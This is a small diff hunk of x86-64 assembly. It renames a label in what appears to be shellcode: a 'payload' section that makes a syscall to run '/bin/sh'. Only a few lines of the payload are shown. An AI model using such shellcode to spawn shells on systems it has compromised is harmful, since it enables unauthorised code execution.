@@ -35,7 +35,7 @@ payload:
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
         syscall                          /* invoke syscall */
 
-.file_to_run:
+file_to_run:
         .ascii  "/bin/sh\0"
         .ascii  "\0"
 
